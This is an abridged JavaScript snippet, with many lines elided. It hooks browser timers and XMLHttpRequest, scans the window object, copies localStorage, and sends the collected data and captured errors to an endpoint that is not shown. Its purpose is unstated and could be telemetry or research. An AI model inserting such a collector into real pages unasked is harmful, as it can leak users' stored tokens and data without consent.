...
(() => {
  ...
  function jsHookTracker(hookName, realHook) {
    return function () {
      let result = realHook.apply(this, arguments);
      globalVar.collection[hookName].push({
  ...
  window.setTimeout = jsHookTracker("setTimeout", window.setTimeout);
  window.setInterval = jsHookTracker("setInterval", window.setInterval);
  function i(t) {
  ...
  window.XMLHttpRequest = jsHookTracker("XMLHttpRequest", window.XMLHttpRequest);
  function a(t) {
  ...
  function exploreWindowObject() {
    ...
    if (Object.keys(local).length) newDiscoveries.localStorage = local;
  ...
  function transmitData(data) {
    ...
    request.onload = function () {
      request.status >= 200 && request.status < 400 ? console.log("Data transfer success") : console.error(`Data transfer failed. statusCode:${request.status}`);
    };
    request.onerror = console.error.bind(null, "Data transmission error");
  ...
  function discoveryTask() {
    let discoveries = exploreWindowObject();
    let discoveryCount = Object.keys(discoveries).length;
    discoveryCount > 0 ? (console.log(`Detected ${discoveryCount} new window properties`), transmitData(discoveries)) : console.log("No new window properties found");
    transmitData(globalVar.collection);
  }
  ...
  window.addEventListener("error", e => {
    globalVar.collection.errors = globalVar.collection.errors || [];
    globalVar.collection.errors.push(JSON.parse(JSON.stringify(e)));
  });
})();